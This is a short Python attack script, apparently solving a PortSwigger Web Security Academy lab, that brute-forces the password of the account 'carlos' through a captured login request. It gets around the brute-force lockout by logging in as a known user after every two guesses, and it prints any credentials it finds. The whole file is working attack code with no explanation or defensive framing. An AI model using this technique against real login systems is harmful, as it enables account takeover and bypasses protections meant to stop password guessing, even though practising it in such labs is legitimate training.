from fartlib import *

req = FartRequest("""
POST /login HTTP/1.1
Host: 0a6e00e204f7c774c022fec4009500e9.web-security-academy.net
Content-Length: 26
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6e00e204f7c774c022fec4009500e9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6e00e204f7c774c022fec4009500e9.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

username=uname&password=pwd
""")

username = "carlos"
# 2 attempts allowed before block
chunks = [passwords[i:i + 2] for i in range(0, len(passwords), 2)]

s = requests.Session()


def reset():
    HttpWorker(req.substitute(uname="wiener", pwd="peter"), session=s).run_wait()


for chunk in chunks:
    reset()
    response = HttpWorker(req.substitute(uname=username, pwd=chunk), session=s)\
        .get_first(lambda x: "Incorrect" not in x.raw_response.text)
    if response:
        print("Found creds:", username, chunk[response.index])
        break
    print("Password not in", chunk)
